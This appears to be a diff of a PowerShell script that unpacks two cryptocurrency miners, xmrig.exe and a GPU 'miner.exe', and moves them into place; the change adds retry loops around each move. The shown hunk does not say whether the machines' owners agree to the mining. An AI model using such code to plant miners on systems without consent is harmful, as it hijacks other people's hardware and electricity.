@@ -50,7 +50,11 @@ if (-not (Test-Path $ce)) {
         for ($j=0;$j-lt 5;$j++) { try { [System.IO.Compression.ZipFile]::ExtractToDirectory($cz, $sDir); break } catch { Start-Sleep -Seconds 2 } }
         Remove-Item $cz -Force -ErrorAction SilentlyContinue
         $uz = Get-ChildItem $sDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
-        if ($uz) { Move-Item $uz.FullName -Destination $ce -Force }
+        if ($uz) { 
+            for ($k=0;$k-lt 5;$k++) {
+                try { Move-Item $uz.FullName -Destination $ce -Force; break } catch { Start-Sleep -Seconds 2 }
+            }
+        }
     }
 }
 
@@ -71,7 +75,11 @@ if ($gd -and -not (Test-Path $ge)) {
         for ($j=0;$j-lt 5;$j++) { try { [System.IO.Compression.ZipFile]::ExtractToDirectory($gz, $sDir); break } catch { Start-Sleep -Seconds 2 } }
         Remove-Item $gz -Force -ErrorAction SilentlyContinue
         $uz = Get-ChildItem $sDir -Filter "miner.exe" -Recurse | Select-Object -First 1
-        if ($uz) { Move-Item $uz.FullName -Destination $ge -Force }
+        if ($uz) { 
+            for ($k=0;$k-lt 5;$k++) {
+                try { Move-Item $uz.FullName -Destination $ge -Force; break } catch { Start-Sleep -Seconds 2 }
+            }
+        }
     }
 }
 
